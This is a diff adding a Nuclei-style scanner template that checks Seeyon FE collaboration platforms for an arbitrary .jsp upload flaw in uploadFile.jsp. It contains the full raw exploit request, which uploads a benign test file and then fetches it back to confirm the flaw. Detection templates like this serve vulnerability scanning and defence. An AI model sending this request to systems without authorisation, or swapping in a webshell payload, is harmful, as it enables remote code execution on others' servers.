@@ -1,0 +1,52 @@
+id: seeyonfe-uploadfile-upload
+
+info:
+  name: seeyonfe-uploadfile-upload
+  author: HB
+  severity: critical
+  description: 致远互联FE协作办公平台uploadFile.jsp文件上传
+
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+
+http:
+  - raw:
+    - |
+      POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=23061845090001.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp HTTP/1.1
+      Host: {{Hostname}}
+      Content-Length: 207
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: 1
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylBU670lIdrGgVSWG
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Cookie: JSESSIONID=64E63D22BDCC849C4050E5713F838F2B
+      Connection: close
+
+      ------WebKitFormBoundarylBU670lIdrGgVSWG
+      Content-Disposition: form-data; name="accessory"; filename="{{filename}}.jsp"
+      Content-Type: application/octet-stream
+
+      test1
+      ------WebKitFormBoundarylBU670lIdrGgVSWG--
+    
+    - |
+      GET /images/upload/{{uploadfilename}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+      Accept: */*
+
+    extractors:
+      - type: regex
+        name: uploadfilename
+        group: 0
+        regex: 
+         - '\d+\.jsp'
+        internal: true
+
+    matchers:
+       - type: dsl
+         dsl:
+           - status_code==200 && contains_all(body_2,"test1")
